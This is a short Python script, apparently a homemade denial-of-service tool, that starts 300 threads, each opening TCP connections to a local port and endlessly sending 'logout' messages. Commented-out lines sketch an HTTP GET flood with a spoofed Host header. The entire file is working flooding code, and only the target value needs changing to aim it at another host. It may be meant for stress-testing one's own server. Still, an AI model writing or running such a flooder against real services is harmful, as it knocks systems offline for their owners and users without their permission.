import socket
import threading
from time import sleep

target = '127.0.0.1'
fake_ip = '182.21.20.32'
port = 8550

attack_num = 0

#TODO
def attack():
    while True:
        # sleep(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        while True:
            s.send(("logout").encode('ascii'))
        #s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        #s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()

for i in range(300):
    thread = threading.Thread(target=attack)
    thread.start()